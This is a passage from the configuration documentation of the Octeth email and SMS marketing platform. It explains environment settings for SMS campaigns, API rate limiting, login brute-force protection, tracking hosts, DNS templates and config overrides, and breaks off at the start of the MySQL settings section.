    SMS_CAMPAIGN_OPTOUT_FOOTER_DEFAULT=" Reply STOP to opt out."   # Default opt-out footer. Quote it, it starts with a space
    SMS_CAMPAIGN_OPTOUT_FOOTER_ENABLED_DEFAULT=true      # Whether new campaigns append that footer
    SMS_OPTOUT_KEYWORDS=STOP,STOPALL,UNSUBSCRIBE,CANCEL,END,QUIT   # Inbound keywords treated as an opt-out
    SMS_REPLY_ATTRIBUTION_DAYS=30                        # How far back a reply is matched to a sent message. Clamped 1 to 3650
    SMS_EVENT_RETENTION_DAYS=365                         # Retention for SMS events. Clamped 30 to 3650
    SMS_CAMPAIGN_QUEUE_RETENTION_DAYS=365                # Retention for campaign queue rows. Clamped 30 to 3650
    SMS_INBOUND_RETENTION_DAYS=365                       # Retention for inbound messages. Clamped 30 to 3650, or 0 to disable pruning
    SMS_TEST_DAILY_LIMIT=10                              # Campaign test sends per account in any 24 hours. 0 turns them off. Clamped 0 to 1000
    SMS_TEST_COOLDOWN_SECONDS=30                         # Seconds between two test sends from one account. Clamped 0 to 3600
    SMS_ANALYTICS_RETENTION_DAYS=365                     # Retention for SMS analytics rows
    SMS_SUPPRESSION_DEFAULT_COUNTRY_CODE=+1              # Country code assumed for a number that arrives without one
    SMS_LINK_EXPIRY_HOURS_DEFAULT=72                     # How long a tracked link stays valid after its message was sent
    SMS_LINK_EXPIRY_HOURS_MAX=8760                       # The longest expiry a campaign may ask for
    SMS_LINK_BOT_DETECTION=true                          # Screen link clicks for bots
    SMS_LINK_CLICK_RATE_LIMIT=30                         # Clicks allowed per link per minute
    SMS_KEITARO_POLL_INTERVAL_SECONDS=300                # Seconds between Keitaro click log reads. Minimum 30
    ```

    `SMS_CAMPAIGN_MAX_RECIPIENTS` is the largest audience a single campaign may target. It is a guard against an accidental send to everybody, not a licence limit, so set it to the largest campaign you actually intend to run rather than to the size of your database.

    `SMS_CAMPAIGN_COST_PER_PART` and `SMS_CAMPAIGN_COST_CURRENCY` are the rate used to estimate what a campaign will cost, and the currency that estimate is labelled with. This is a rate you configure, not a price quoted by the gateway, so the estimate is an estimate. Actual cost comes from delivery reports where the gateway provides one. Set the rate to your own negotiated price per message part.

    `SMS_CAMPAIGN_COST_DRIFT_TOLERANCE` is how far the real cost may drift above the confirmed estimate before the send is stopped for re-confirmation, expressed as a fraction. `0.05` is five percent. Set it to `0` and any drift at all stops the send, which is rarely what you want on an audience with mixed destination countries. Set it high and a mis-estimated campaign runs to completion before anyone is told.

    `SMS_CAMPAIGN_QUIET_HOURS_START` and `SMS_CAMPAIGN_QUIET_HOURS_END` are the quiet hours applied to new campaigns, in the campaign's own timezone. They are defaults for the campaign form, so changing them does not alter a campaign that has already been created.

    `SMS_CAMPAIGN_DEFAULT_SEND_RATE_PER_MINUTE` is the send rate new campaigns start with. `0` means unlimited, and the per-gateway rate limit still applies on top of whatever is set here, so this is a way to slow a campaign down rather than a way to speed one up.

    `SMS_CAMPAIGN_JOURNEY_RESERVE_PERCENT` is the share of a gateway's send capacity held back from campaigns so that journey and transactional SMS keep flowing while a large campaign is running. At `0` a big campaign can consume the whole gateway rate and delay a password reset message behind it. The clamp ceiling is 50, because reserving more than half the capacity would starve the campaigns the reserve exists to coexist with.

    `SMS_CAMPAIGN_OPTOUT_FOOTER_DEFAULT` and `SMS_CAMPAIGN_OPTOUT_FOOTER_ENABLED_DEFAULT` set the opt-out footer appended to campaign messages by default. The footer counts toward the message length and therefore toward the number of parts and the cost, so a long footer can push a one-part message into two. Quote the value: the shipped default begins with a space, which separates it from the message body.

    `SMS_OPTOUT_KEYWORDS` is the comma-separated list of inbound keywords treated as an opt-out. Add local-language keywords here if you send to recipients who will not reply in English.

    `SMS_REPLY_ATTRIBUTION_DAYS` is how far back an inbound reply is matched against sent messages in order to attribute it to a campaign. A longer window attributes more late replies and raises the chance of attributing a reply to the wrong campaign where a recipient received several.

    `SMS_EVENT_RETENTION_DAYS`, `SMS_CAMPAIGN_QUEUE_RETENTION_DAYS` and `SMS_INBOUND_RETENTION_DAYS` are the retention periods for SMS events, campaign queue rows and inbound messages. Reporting cannot look further back than the events retained, so cutting event retention cuts the reporting history with it. The clamp floor of 30 days exists because a retention of a day or two is easier to type than to notice, and would silently destroy the reporting the feature exists to provide.

    `SMS_INBOUND_RETENTION_DAYS` alone also accepts `0`, which switches inbound pruning off entirely and keeps every inbound message. That is the one value below the floor that is honoured rather than raised to 30, because it is how an install says "never delete these", and raising it would delete the replies the operator was keeping. The other two have no such setting: to keep events or queue rows for longer, raise the number.

    `SMS_TEST_DAILY_LIMIT` and `SMS_TEST_COOLDOWN_SECONDS` limit campaign test sends <Badge type="tip" text="New in v6.0.4" />: how many tests one account may send in any 24 hours, and how many seconds apart. A test goes only to a number the account has verified with a code, so these limit cost rather than reach. `SMS_TEST_DAILY_LIMIT=0` turns test sends off for every account. Both are defaults that the staff SMS settings screen overrides.

    `SMS_SUPPRESSION_DEFAULT_COUNTRY_CODE` is the country code assumed when a phone number arrives without one. It decides how a bare national number is normalized, and therefore whether a suppression entry written in one form matches a number sent in another: a contact suppressed as `5550100001` and later sent as `+15550100001` is only recognised as the same person if this value turns the first into the second. Set it to the country the majority of your contacts are in, and store numbers in full international form wherever you can, which makes the setting irrelevant.

    `SMS_LINK_EXPIRY_HOURS_DEFAULT` is how long a tracked link keeps working after the message carrying it was sent, and `SMS_LINK_EXPIRY_HOURS_MAX` is the longest a campaign may ask for. The expiry runs from the send rather than from the campaign, so a campaign paused for a week still gives every recipient the same window from the moment their own message went out.

    `SMS_LINK_BOT_DETECTION` screens clicks for automated traffic, which matters more on SMS than on email because carrier and handset security scanners follow links. A click identified as a bot is flagged and left out of reports by default rather than discarded, so it is still there to look at; pass `IncludeBots=1` to the reporting endpoints to see it.

    `SMS_LINK_CLICK_RATE_LIMIT` is how many clicks one link accepts per minute before further clicks are rate limited. It protects the click endpoint, which is public and unauthenticated, from being used to inflate a campaign's numbers.

    `SMS_ANALYTICS_RETENTION_DAYS` is how long SMS analytics rows are kept.

    Introduced in v6.0.0 (issue #2742).

    `SMS_KEITARO_POLL_INTERVAL_SECONDS` is how often the Keitaro click poller (`oempro_sms_keitaro_poller`) reads the click log of every account connected to Keitaro. Each read starts 120 seconds before the end of the previous one, so a click Keitaro logs late is still picked up, and a click read twice is stored once. A lower value brings Keitaro clicks into SMS campaign reports sooner and calls each Keitaro server more often. Values below `30` are raised to `30`. When a read fails (a wrong API key, an unreachable server, or a login page instead of the API), the account is marked as failing with the error, nothing is skipped, and the next interval reads the same window again. Restart the poller after changing it.

    Introduced in v6.0.4 (issue #3720).

51. **API Rate Limit Enforcement**

    ```bash
    API_ENFORCE_RATE_LIMITS=true   # Enforce the request budget each API command declares (on by default, including on upgrades)
    ```

    Every API command declares a request budget, most of them 100 requests per 60 seconds. Before v6.0.0 only six commands applied theirs. With this set to `true`, every call that arrives through `api.php` is counted against its command's budget, per authenticated account (admin, user or subscriber), or per client address for a command that needs no credential. A call over the budget answers **HTTP 429** with a `Retry-After` header and the standard error envelope with code `429`. Calls that Octeth's own screens make internally are not counted, and if Redis is unavailable calls are allowed rather than refused.

    Unlike most security settings added in this release, the code default is `true`, so an upgraded install starts enforcing with no action. Set it to `false` to restore the previous behaviour if you have a bulk integration you cannot reshape immediately, then pace that integration within the budgets and turn enforcement back on. The budgets themselves are part of each command's definition and cannot be changed from this file.

    Introduced in v6.0.0 (issue #2887).

52. **Login Brute-Force Protection**

    ```bash
    LOGIN_THROTTLE_ENABLED=true                    # Refuse repeated failed sign-ins and password reminders (on by default, including on upgrades)
    LOGIN_THROTTLE_MAX_FAILURES_PER_IDENTITY=10    # Failures one username or email address may make within the window (3 to 1000, default: 10)
    LOGIN_THROTTLE_MAX_FAILURES_PER_IP=50          # Failures one client address may make within the window, across all accounts (3 to 100000, default: 50)
    LOGIN_THROTTLE_WINDOW_SECONDS=900              # Counting window in seconds, starting at the first failure (60 to 86400, default: 900)
    LOGIN_THROTTLE_LOCKOUT_SECONDS=900             # How long a locked name or address stays refused, in seconds (60 to 86400, default: 900)
    ```

    These settings limit repeated failed sign-ins on the user, administrator and subscriber login (the login screens and the `User.Login`, `Admin.Login` and `Subscriber.Login` API commands) and repeated password-reminder requests (the forgot-password screens and `User.PasswordRemind` and `Admin.PasswordRemind`). Failures are counted in Redis, separately for the name being signed in as and for the client address, and separately for each area, so failures on the user login never count against the administrator login. The name is the username or email address, or the list and email address for a subscriber, and it is matched the way the login itself matches it, ignoring case and accents, so `Admin`, `admin` and `ádmin` share one count. The client address is the one resolved through `TRUSTED_PROXIES`, and an IPv6 client is counted by its /64 network.

    When either count reaches its limit within `LOGIN_THROTTLE_WINDOW_SECONDS`, further attempts for that name, or from that address, are refused for `LOGIN_THROTTLE_LOCKOUT_SECONDS`. A refused attempt answers `ErrorCode` 429 with `RetryAfterSeconds`, and over `api.php` also **HTTP 429** with a `Retry-After` header. The refusal happens before the credentials are looked up, so it is the same for an existing and an unknown account, and it refuses a correct password too until the lock expires. A lock always expires, so there is no permanent lockout.

    A successful sign-in clears the count for that name, so a few typos followed by the right password leave nothing behind. A successful administrator sign-in also clears the user-area count for the same name, because the new user interface tries a user sign-in before an administrator one. A wrong two-factor code or recovery code counts as a failure, and the first step of a two-factor sign-in, which sends no code, does not. Sign-in with a user API key or a valid `AdminAPIKey` is not counted.

    A password reminder counts every request, not only failures, because each one that matches an account sends an email. `Admin.PasswordRemind` and both forgot-password screens count per email address and per client address. `User.PasswordRemind` called through `api.php` needs an admin credential and is often called by one server on behalf of many customers, so there it is counted per email address only.

    The code default is `true`, like `API_ENFORCE_RATE_LIMITS`, so an upgraded install is protected with no action. Set it to `false` to switch the limiter off. If many of your users sign in from one shared address, or an integration signs many people in from one server, raise `LOGIN_THROTTLE_MAX_FAILURES_PER_IP`. A numeric value outside its allowed range falls back to the default, and if Redis is unreachable, attempts are allowed rather than refused.

    Introduced in v6.0.2 (issue #2986).

53. **API ResponseFormat Case-Insensitive Matching**

    ```bash
    API_RESPONSEFORMAT_CASE_INSENSITIVE=false   # Match ResponseFormat case-insensitively (off by default)
    ```

    The API's `ResponseFormat` parameter is matched case-sensitively: only `JSON` and `XML` are recognised, and every other spelling, including lowercase `xml`, is answered with JSON without an error. Set this to `true` to match it case-insensitively, so `xml`, `Xml` and `json` resolve to `XML` and `JSON`. The resolved format is shared by normal responses and hard-failure error responses, so one request never answers in two formats. A value that is not a spelling of `JSON` or `XML` still falls back to JSON.

    Turning it on changes what some existing callers receive: an integration that sends lowercase `xml` and parses the JSON it gets today would start receiving XML with `Content-Type: text/xml`. Check your integrations before enabling it. The default is `false` in both the code and the shipped example file, so neither a fresh install nor an upgrade changes behaviour unless you set it.

    Introduced in v6.0.1 (issue #2684).

54. **Journey Worker Fairness**

    ```bash
    JOURNEY_WORKER_MAX_PER_JOURNEY=10   # Max journey workers busy with the same journey at once, 0 disables (default: 10)
    ```

    Journey workers used to take the oldest pending entry of any journey, so one journey with a large backlog could occupy every worker. Other journeys stopped progressing until it drained, and a journey full of Decision nodes could saturate the server. Each journey can now use at most this many workers at the same time. Workers above the cap process other journeys, or stay idle when only the capped journey has work, which slows that journey down in exchange for bounded load.

    The cap only matters when you run more journey workers than its value, so the default leaves the standard three-worker setup unchanged. Lower it if you have raised the number of `oempro_journeys_worker` processes and want a single journey to use only part of them. `0` turns the cap off. Accepted range `0`–`1000`.

    Introduced in v6.0.1 (issue #1902).

55. **Email Gateway DNS Host Names**

    ```bash
    EMAILGATEWAY_DNS_SUBDOMAIN=sl        # Subdomain Octeth uses under an email gateway sender domain, e.g. sl.example.com (default: sl)
    EMAILGATEWAY_DNS_TRACK_PREFIX=track  # Prefix of the gateway tracking host, e.g. track-sl.example.com (default: track)
    EMAILGATEWAY_DNS_TRACK_MERGE=-       # Character between the tracking prefix and the subdomain (default: -)
    ```

    These three keys name the hosts Octeth uses under a sender domain added through the email gateway: the subdomain (`sl.example.com` with the defaults) and the tracking host, built from the prefix, the merge character and the subdomain (`track-sl.example.com`). They are the email gateway counterparts of `EMAILCAMPAIGN_DNS_SUBDOMAIN`, `EMAILCAMPAIGN_DNS_TRACK_PREFIX` and `EMAILCAMPAIGN_DNS_TRACK_MERGE`. A sender domain's own **Custom Subdomain Settings** (see [Sender Domains](/v6.0.4/using-octeth/sender-domains)) override them for that domain.

    The default `EMAILGATEWAY_DNS_TEMPLATES` is built from these three values. When Octeth regenerates a gateway sender domain's DNS records with a custom subdomain or tracking prefix, it looks for these literal values in the template and replaces them with the domain's own values. If you set `EMAILGATEWAY_DNS_TEMPLATES` to your own JSON, write the host names in it with the same literals as these three keys. Otherwise the replacement finds nothing, and a domain's custom subdomain or tracking prefix never reaches its regenerated DNS records.

56. **Neutral Fallback Tracking Host**

    ```bash
    TRACKING_FALLBACK_DOMAIN=            # Host for tracking and unsubscribe links when a send has no sender domain tracking host, e.g. track.example.net (default: empty)
    ```

    Click tracking, open tracking, unsubscribe and web-version links use the sender domain's own tracking host when one is available. When it is not (for example an Email Gateway or journey sender domain whose DNS records do not include its tracking host, or a send without a sender domain), the links fall back to the tracking domains of the user group's delivery server, and to the `APP_URL` host when none is set. On a white-label install those are often the application or backend host name, which then appears in every subscriber-facing link.

    Set `TRACKING_FALLBACK_DOMAIN` to a neutral host you own to use it for that fallback instead. It applies to every mail type: campaigns, autoresponders, transactional email, Email Gateway and journey email, including the `List-Unsubscribe` and `X-Report-Abuse` headers. With the key empty (the default), behavior is unchanged (issue #3308).

    Octeth picks the tracking host in this order, and the first one available wins:

    1. The sender domain's own tracking host, when the domain is verified and its tracking host is provisioned.
    2. `TRACKING_FALLBACK_DOMAIN`, when set.
    3. The link and open tracking domains of the user group's delivery server.
    4. The `APP_URL` host.

    **Global segment routing.** A global segment can route its recipients through a specific delivery server, and that send normally uses the routed delivery server's tracking domains. When `TRACKING_FALLBACK_DOMAIN` is set, it replaces those tracking domains too, so no delivery server host reaches subscriber mail through that path. The routed delivery server still sends the email. Only the host in the links changes.

    **Links already sent.** Changing the key affects new mail only. Links in email sent earlier keep their original host, so keep the previous host (a delivery server tracking domain or the `APP_URL` host) resolving and serving HTTPS for as long as those links should work.

    To set it up:

    - Enter the host only, without `https://` or a path, for example `track.example.net`. A value that is not a valid host name is ignored, and the previous fallback applies.
    - Create one DNS record for the host that points at this Octeth server: an `A` record to the server's IP address, or a `CNAME` to your `APP_URL` host. No MX, SPF or DKIM records are needed, because the host only serves the tracking and unsubscribe links.
    - Keep the record DNS-only. Octeth's Caddy proxy issues the host's TLS certificate from Let's Encrypt automatically on its first HTTPS request, which requires the host to reach this server directly on ports 80 and 443.
    - **CDN limitation.** Behind a CDN or proxy (for example Cloudflare with the proxy enabled) the certificate cannot be issued, and links on the host fail over HTTPS. Unlike the application domain, which can use a static certificate through `APP_DOMAIN_TLS_CERT`, the fallback tracking host has no static certificate option, so it must stay DNS-only.
    - Restart the backend workers after changing the key (`./cli/octeth.sh backend:restart`) so long-running workers pick it up.

    The staff Sender domain health report and the user's sender domain edit page flag each Enabled domain whose Email Gateway and journey email uses the fallback host, and name the host. The flag follows the Email Gateway rule: a domain is on the fallback when Sender Domain Management is off for its user group, or when its stored DNS records do not include its tracking host. `admin.senderdomains.health.get` returns it as `TrackingFallbackHost` when called with `IncludeTrackingFallback=true`.

    Click links in Email Gateway and journey email are accepted on the fallback host, the `APP_URL` host and every delivery server's link tracking domain, in addition to the sender domain's own subdomains. Any other host is still rejected as a possible phishing link.

57. **Overrides for `config/global` Settings**

    Each key in this item is read by a file in `config/global/` and falls back to the default shown when it is absent from `.oempro_env`. They are listed at the end of `_dockerfiles/examples/.oempro_env.example` (issue #3154), in two forms:

    - **Shipped** keys are uncommented in the example with exactly their code default. An upgrade appends a missing key with the example's value, so adding these keys to an existing install changes nothing. Edit a value to tune the setting.
    - **Commented** keys are documentation only, and an upgrade never adds them. They are rarely changed, are names that must match what is already deployed, or have a computed or placeholder default. Copy the line into `.oempro_env` without the leading `#` to override one.

    Every key is read when a PHP process starts. A change applies to the next web request at once, and to the background workers after `./cli/octeth.sh backend:restart`.

    **Logging, profiling and caching** (`config/global/app.php`)

    | Key | Default | Form | What it does |
    |---|---|---|---|
    | `CAMPAIGN_DELIVERY_LOG_LEVEL` | `INFO` | Shipped | Log level of the campaign delivery workers: `DEBUG`, `INFO`, `NOTICE`, `WARNING`, `ERROR`, `CRITICAL`, `ALERT` or `EMERGENCY`. `SENDENGINE_LOG_LEVEL` covers the controller that starts them. |
    | `CAMPAIGN_DELIVERY_PROFILING_ENABLED` | `false` | Shipped | Writes detailed timing logs for campaign delivery operations. |
    | `CAMPAIGN_BATCH_PROFILING_RETENTION_DAYS` | `30` | Shipped | Days of campaign batch profiling data kept before the cleanup cron removes it. |
    | `JOURNEY_WORKER_LOG_ENABLED` | `true` | Shipped | Turns journey worker logging on or off. |
    | `JOURNEY_WORKER_LOG_LEVEL` | `INFO` | Shipped | Log level of the journey workers, with the same values as `CAMPAIGN_DELIVERY_LOG_LEVEL`. |
    | `PERSONALIZATION_PROFILING_ENABLED` | `false` | Shipped | Writes personalization timing logs for 1 in 100 calls. |
    | `LOG_MYSQL_QUERIES_GRANULAR` | `false` | Shipped | Writes MySQL query logs to a separate file per request or process. Very verbose, for debugging only. |
    | `OEMPRO_OPTIONS_CACHE_TTL` | `86400` | Shipped | Seconds the cached application options are kept in Redis (24 hours). |
    | `ALLOW_SAME_USER_EMAILADDRESS` | `false` | Commented | Lets several user accounts share one email address. |
    | `POST_SUBSCRIPTION_DATA_TRANSFER_TYPE` | `INLINE` | Commented | How a subscription form passes the new subscriber to its redirect page: `INLINE` or `POST-JSON`. |
    | `DEMO_MODE_ENABLED` | `false` | Commented | Demo mode: email delivery and other core tasks are disabled. |
    | `DISABLE_LATEST_NEWS` | `false` | Commented | Hides the news fetched from Octeth servers in the admin area. |
    | `CREDITS_SYSTEM_ENABLED` | `true` | Commented | Credit system for email delivery. When `false`, credit checks and deductions are skipped. |
    | `MAINTENANCE_MODE_REDIRECT_TO` | empty | Commented | URL visitors are sent to while maintenance mode is on. Empty shows the built-in maintenance page. |
    | `MYSQL_ERRORS_ON_SCREEN` | `false` | Commented | Shows MySQL errors on screen. Never enable it on a production install. |

    **Email delivery** (`config/global/email_delivery.php`)

    | Key | Default | Form | What it does |
    |---|---|---|---|
    | `BATCH_SIZE` | `100` | Shipped | Campaign recipients loaded per queue batch. |
    | `BATCH_INTERVAL_SIZE` | `100` | Shipped | Recipients loaded per interval within a batch. |
    | `BOUNCE_PROCESSING_THREADS` | `10` | Shipped | Maximum parallel threads for IMAP bounce and FBL mailbox processing. |
    | `EMAILGATEWAY_MAX_RETRIES` | `3` | Shipped | Email Gateway retries of a transient SMTP failure (a 4xx reply, a connection, TLS or timeout error). |
    | `EMAILGATEWAY_RETRY_BACKOFF_BASE_SECONDS` | `30` | Shipped | Base delay before an Email Gateway retry. It doubles on each retry: 30, 60, 120 seconds. |
    | `ENFORCED_FROM_APPlY_TO_REPLYTO` | `false` | Commented | Also applies a user group's enforced From address to the Reply-To header. The key name is mixed case, write it exactly as shown. |
    | `EMAIL_DELIVERY_HOSTNAME` | `localhost.localdomain` | Commented | Host name the mailer announces to the SMTP server when no web server name is known, which is the case in every background worker. |
    | `SEND_FBL_NOTIFICATIONEMAIL` | `false` | Commented | Emails the administrator when FBL detection fails. |
    | `EMAIL_REQUESTS_ENABLED` | `false` | Commented | Subscribe and unsubscribe by email request, for all lists. |
    | `EMAIL_SOURCE_ENCODING` | `quoted-printable` | Commented | Content transfer encoding: `8bit`, `7bit`, `binary`, `base64` or `quoted-printable`. |
    | `SENDGRID_EMAIL_HEADER` | `false` | Commented | Adds a SendGrid compatible `X-SMTPAPI` header for tracking. |
    | `IMAGE_EMBEDDING_ENABLED` | `true` | Commented | Allows image embedding in email content. `false` turns it off for every email. |
    | `DISABLE_PRIORITY_HEADER` | `true` | Commented | Leaves out the `X-Priority` header, which helps deliverability. |
    | `DISABLE_LINK_REDIRECTION_HIJACKING_SECURITY` | `false` | Commented | Turns off the link redirection hijacking check on tracked links. Keep it `false`. |
    | `TRACKING_URL_PROTOCOL` | `https` | Commented | Scheme of tracking links: `https` or `http`. |

    **DNS** (`config/global/dns.php` and `config/global/sender_domain_dns.php`)

    | Key | Default | Form | What it does |
    |---|---|---|---|
    | `MX_CACHE_TTL_SECONDS` | `86400` | Shipped | Seconds a recipient domain's MX lookup stays cached. |
    | `RECIPIENT_MX_LOOKUP_DNS_SERVERS` | `1.1.1.1,8.8.8.8` | Shipped | Comma-separated name servers used for recipient domain MX lookups. |
    | `DNS_SPF` | `include:spf.youdomain.com` | Commented | SPF fragment shown and checked on the admin delivery server screen. Placeholder, set your own. |
    | `DNS_DKIM_KEY` | `key1` | Commented | DKIM selector shown on the admin delivery server screen. |
    | `DNS_DKIM` | `<public_key>` | Commented | DKIM public key shown on the admin delivery server screen. Placeholder, set your own. |
    | `DNS_DMARC` | `v=DMARC1; p=none; ...` | Commented | DMARC record shown on the admin delivery server screen. Placeholder with sample addresses, set your own and wrap it in double quotes because it contains spaces. |
    | `DNS_SENDER_DOMAIN`, `DNS_LINK_TRACKER`, `DNS_OPEN_TRACKER` | `primary-sender-domain.com` | Commented | CNAME targets shown on the admin delivery server screen. Placeholders, set your own. |
    | `EMAILCAMPAIGN_DNS_SUBDOMAIN` | `sl` | Commented | Subdomain Octeth uses under a campaign sender domain, for example `sl.example.com`. |
    | `EMAILCAMPAIGN_DNS_TRACK_PREFIX` | `track` | Commented | Prefix of the campaign tracking host, for example `track-sl.example.com`. |
    | `EMAILCAMPAIGN_DNS_TRACK_MERGE` | `-` | Commented | Character between the tracking prefix and the subdomain. |
    | `EMAILCAMPAIGN_DNS_TEMPLATES` | built from `APP_URL` and the three keys above | Commented | JSON array of the DNS record templates for campaign sender domains. Leave it unset unless you replace the whole template. |
    | `EMAILGATEWAY_DNS_TEMPLATES` | built from `APP_URL` and the `EMAILGATEWAY_DNS_*` keys (item 55) | Commented | JSON array of the DNS record templates for Email Gateway sender domains. Leave it unset unless you replace the whole template. |

    Changing `EMAILCAMPAIGN_DNS_SUBDOMAIN`, `EMAILCAMPAIGN_DNS_TRACK_PREFIX` or `EMAILCAMPAIGN_DNS_TRACK_MERGE` changes the DNS records every new campaign sender domain must publish. The same substitution rule as item 55 applies: a custom `EMAILCAMPAIGN_DNS_TEMPLATES` must write its host names with the same literals as these three keys.

    **Features and the user area** (`config/global/features.php`)

    | Key | Default | Form | What it does |
    |---|---|---|---|
    | `WEBHOOK_TIMEOUT_SECONDS` | `5` | Shipped | Connection timeout of the webhook worker, in seconds. |
    | `RETENTION_DAYS_CAMPAIGN_QUEUE` | `250` | Shipped | Days campaign queue tables are kept before the cleanup command drops them. |
    | `WYSIWYG_ENABLED` | `true` | Commented | WYSIWYG editor for email content. |
    | `REDIRECT_ON_LOGIN` | `false` | Commented | Adds the requested page as `RedirectURL` when a logged-out visitor is sent to the login page. |
    | `HTACCESS_ENABLED` | `true` | Commented | Builds URLs without `index.php?`, which needs the bundled rewrite rules. |
    | `OCTETH_TRACKERS` | `true` | Commented | Octeth trackers in the admin area footer. |
    | `OPTOUT_CONFIRMATION` | `true` | Commented | Shows a confirmation page before an opt-out request is processed. |
    | `DEDUCT_CREDITS_FROM_AR` | `true` | Commented | Deducts email credits for autoresponder deliveries. |
    | `CURRENCY_DECIMALS` | `2` | Commented | Decimal places used to display currency in the user area. |
    | `SEND_SUBSCRIBER_INFORMATION` | `true` | Commented | Sends subscriber information in the query string of a subscription redirect URL. |
    | `DISABLE_WEB_CRONS` | `true` | Commented | When `true`, `cli/pop3_requests.php` (subscribe and unsubscribe by email) exits without running. |
    | `DISPLAY_CREDIT_NOTICE` | `true` | Commented | Shows a notice in the user area when credits fall below `CREDIT_NOTICE_THRESHOLD`. |
    | `CREDIT_NOTICE_THRESHOLD` | `5000` | Commented | Credit balance below which that notice appears. |
    | `DISPLAY_LIMIT_NOTICE` | `true` | Commented | Shows a notice in the user area when the monthly campaign or email limit is reached. |
    | `SUBSCRIBE_ON_UNSUBSCRIPTION_ENABLED` | `true` | Commented | Offers the "subscribe to another list on unsubscription" list option. |
    | `REDIRECT_ON_UNSUBSCRIPTION_ENABLED` | `true` | Commented | Offers the "redirect to my own unsubscription confirmed page" list option. |
    | `BLOCKED_MYSQL_HOSTS` | empty | Commented | Comma-separated hosts that list sync MySQL connections may not use, for example `localhost,127.0.0.1`. |
    | `SIMPLIFIED_CAMPAIGN_DEFAULT_CONTENT_MODE` | `Both` | Commented | Default content mode of the simplified campaign editor: `HTML`, `Plain` or `Both`. |
    | `FREE_USER_GROUP_IDS` | empty | Commented | Comma-separated IDs of free or trial user groups. |
    | `ENFORCE_PHONE_VERIFICATION_ON_SIGNUP_TO_SEND_EMAILS` | `false` | Commented | Requires a verified phone number at signup before a new user can send email. |
    | `OEMPRO_JOURNEY_BUILDER_DEBUG_HIDE_AFTER_DECISION_MERGE_BRANCH` | `true` | Commented | Journey Builder display aid that hides the branch after a decision merge. |

    **SMS** (`config/global/sms.php`)

    | Key | Default | Form | What it does |
    |---|---|---|---|
    | `SMS_LINK_SHORT_CODE_LENGTH` | `6` | Shipped | Length of generated short link codes, 4 to 10. |
    | `SMS_LINK_TRACKING_ENABLED` | `true` | Shipped | Tracks SMS short link clicks. |
    | `SMS_LINK_GEO_TRACKING` | `true` | Shipped | Resolves the location of an SMS link click. |
    | `SMS_LINK_CLEANUP_DAYS` | `180` | Shipped | Days short links are kept before the cleanup cron deletes them. |
    | `SMS_QUEUE_BATCH_SIZE` | `100` | Shipped | SMS queue messages processed per batch. |
    | `SMS_RETRY_MAX_ATTEMPTS` | `3` | Shipped | Retries of a failed SMS send. |
    | `SMS_GATEWAY_TIMEOUT` | `30` | Shipped | SMS gateway request timeout, in seconds. |
    | `SMS_MAX_LENGTH_GSM7` | `1600` | Shipped | A journey SMS in GSM-7 text longer than this many characters is truncated. |
    | `SMS_MAX_LENGTH_UNICODE` | `700` | Shipped | The same limit for Unicode text. |
    | `SMS_SUPPRESSION_CACHE_TTL` | `3600` | Shipped | Seconds an SMS suppression lookup stays cached. |
    | `SMS_SUPPRESSION_IMPORT_BATCH_SIZE` | `1000` | Shipped | Rows per batch when importing an SMS suppression list. |
    | `SMS_LINK_DOMAIN` | empty | Commented | Host of SMS short links, optionally with `http://` or `https://` (`https` when omitted). Empty uses the `APP_URL` host. |
    | `SMS_LINK_CHARSET` | `ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789` | Commented | Characters short codes are drawn from. A change does not affect codes already sent. |

    **Website event and revenue tracking, services, cookies and charts**

    | Key | Default | Form | What it does |
    |---|---|---|---|
    | `EVENT_TRACKER_JS_COMMENT` | `<!-- Octeth -->` | Commented | Comment written into the website event tracker snippet. Wrap the value in double quotes. |
    | `EVENT_TRACKER_JS_OBJECT_NAME` | `oct` | Commented | JavaScript object name of the website event tracker. |
    | `EVENT_TRACKER_JS_FILENAME` | `t-et.min.js` | Commented | File name of the tracker script: `track.min.js`, or a name starting with `t-` and ending with `.min.js`. |
    | `EVENT_TRACKER_JS_DOMAIN` | the `APP_URL` host | Commented | Host serving the tracker script. Any host that points to the Octeth server. |
    | `WEBSITE_EVENT_JS_OBJECT_VARIABLE_NAME` | `octObj` | Commented | JavaScript variable of the website event object. |
    | `WEBSITE_EVENT_JS_COOKIE_NAME` | `octethUUID` | Commented | Cookie that identifies a website visitor. |
    | `REVENUE_TRACKING_PARAMETER` | `pr` | Commented | URL parameter carrying the revenue tracking value. |
    | `REVENUE_TRACKING_COOKIE_NAME` | `oempro_pr` | Commented | Revenue tracking cookie name. |
    | `REVENUE_TRACKING_ATTRIBUTION_WINDOW` | `2592000` | Commented | Revenue attribution window in seconds (30 days). |
    | `SPAM_FILTER_URL` | `http://192.168.99.105/system/email/spamtest` | Commented | Spam test endpoint. The default is the bundled `oempro_system` container. |
    | `COOKIE_USER_LOGINREMIND`, `COOKIE_ADMIN_LOGINREMIND` | `oempro_user_loginreminder`, `oempro_admin_loginreminder` | Commented | Names of the "remember me" login cookies. A change logs everyone out of "remember me". |
    | `CHART_COLORS` | `0176CC,FF9701,259E01,ED561B,E434FA` | Commented | Comma-separated series colours of the legacy report charts, hex without `#`. |
    | `CHART_TEXT_COLOR`, `CHART_AXES_COLOR`, `CHART_INDICATOR_COLOR`, `CHART_INDICATOR_TEXTCOLOR` | `323232`, `666666`, `D9EBF7`, `000000` | Commented | Text, axis and indicator colours of the legacy report charts. |

    The names in the first group are part of the tracking snippets already installed on websites, so changing one stops those snippets from reporting until they are replaced.

    **No longer read from `.oempro_env`.** `CHARSET`, `APP_DIRNAME`, `FRAMEWORK_VERSION`, `ELASTICSEARCH_URL`, `DELETE_ALL_EMAILS`, `CRON_PHP_RUN_INTERVAL`, `REVENUE_TRACKING_ATTRIBUTION_TOUCH_POINTS`, `SMS_LINK_PREVIEW_ENABLED`, `SMS_SUPPRESSION_EXPORT_BATCH_SIZE` and `SMS_SUPPRESSION_USE_BLOOM_FILTER` were read from `.oempro_env` but are internal values or have no effect, so they are now fixed in code and a value set for them is ignored. Remove them from `.oempro_env` if present.

    Introduced in v6.0.2 (issue #3154).


::: warning Important
The `.oempro_env` file contains sensitive credentials. Never commit this file to version control or share it publicly. Keep secure backups in encrypted storage.
:::

### Service-Specific Environment Files

#### `.oempro_mysql_env` - MySQL Configuration

Configures the MySQL database server that powers Octeth's data storage.

**Location:** `/opt/octeth/.oempro_mysql_env`

**Configuration:**
```bash
HOSTNAME=oempro_mysql              # MySQL container hostname
MYSQL_ROOT_PASSWORD=password       # MySQL root user password
```

::: tip
